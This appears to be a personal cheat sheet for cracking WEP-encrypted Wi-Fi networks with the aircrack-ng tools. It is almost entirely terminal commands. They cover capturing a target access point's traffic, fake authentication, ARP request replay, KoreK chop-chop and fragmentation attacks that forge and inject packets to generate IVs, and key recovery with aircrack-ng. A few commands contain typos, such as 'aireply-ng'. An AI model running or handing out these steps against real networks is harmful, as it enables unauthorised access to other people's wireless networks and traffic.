#airodump-ng [MonitorModeInterface]   // get WEP AP from the output
#airodump-ng --bssid <BSSID> --channel <CHANNEL> --write <fileName> [MonitorModeInterface]

** while keeping the above capturing running, go to the directory where fileName.cap is saved and run below command to crack the key
#aircrack-ng fileName.cap     // in the output check for KEY FOUND!

========================= Above attack works if the network is busy and we can capture enough packets to crack it ================

Problem: 
------------
  -  If the network is not busy or no client is associated with the AP
  -  It would take some time to capture enough IVs.

Solution:
------------
  -  Force the AP to generate new IVs [FAKE AUTHENTICATION ATTACK]


FAKE AUTHENTICATION ATTACK
---------------------------------------------------
1. Associate with the AP before launching the attack. [ because by default AP ignore any requests they get from any device, unless the device is
connected to this network or associated with it.]

TERM1 => #airodump-ng --bssid <BSSID> --channel [CHANNEL] --write [FileName_test] [MonitorModeInterface]   // keep running this and on another terminal try below command.
TERM2 => #aireplay-ng --fakeauth 0 -a [target_AP_mac] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)]  [MonitorModeInterface]

2.1 Once Associated with AP, we can inject the packets to force the access points to generate new packets with new IVs for thsis
we are going to perform ARP Request Reply 
        {
          1. wait for an ARP packet. 
          2. Capture it, and replay it. This causes the AP to produce another packet with a new IV. 
          3. Keep doing it till we have enough IVs to crack the key.
        }

TERM3 =>aireplay-ng --arpreplay -b [target_AP_mac_BSSID] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)] [MonitorModeInterface]
TERM2 => #aireplay-ng --fakeauth 0 -a [target_AP_mac_BSSIDc] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)]  [MonitorModeInterface]
TERM4 => #aircrack-ng [FileName_test.cap]


OR

2.2 Another method to inject packets to increase the data is KOREK Chop Chop Attack. But it's more complex than ARP Request Replay
        {
          1. Determine packet key stream. 
          2. Forge a new packet. 
          3. Inject it in the traffic.
        }

TERM3 => #aireplay-ng --chopchop -b [target_AP_mac_BSSID] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)]  [MonitorModeInterface]  // will get  command_check_output_replay_dec.xor
TERM3 => #packetforge-ng -0 -a [target_AP_mac_BSSID] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)] -k [DESTINATION_IP_255.255.255.255] -l [SOURCE_IP_255.255.255.255] -y [file saved from above command_check_output_replay_dec.xor] [filename_chopchop-forged-packet]
TERM2 => #aireplay-ng --fakeauth 0 -a [target_AP_mac_BSSIDc] -h [kali_wifi_mac_iwconfig_first12digits_unspec_ReplaceMINUS(-)WITHCOLONS(:)]  [MonitorModeInterface]
TERM3 => #aireply-ng -2 -r [filename_chopchop-forged-packet] [MonitorModeInterface] //keep this Running
TERM4 => #aircrack-ng [FileName_test.cap]     // data reach aroun 20,000



OR

2.3 Fragmentation Attack

The goal of this method is to obtain 1500 bytes of the PRGA,
this can be used to forge a new packet which can be injected into the traffic to generate new IV's.

TERM3 => #aireplay-ng --fragment -b [target MAC] -h [your MAC] [MonitorModeInterface]        // Obtain PRGA
TERM3 => #packetforge-ng -0 -a [target MAC] -h [your MAC] -k 255.255.255.255 -l 255.255.255.255 -y [out from last step.xor] -w [output] //Forge a new packet
TERM3 => #aireplay-ng -2 -r [out from last step] [MonitorModeInterface]                     // Inject the forged packet into the traffic to generate new IVs.
TERM4 => #aircrack-ng [FileName_test.cap]     // data reach aroun 20,000
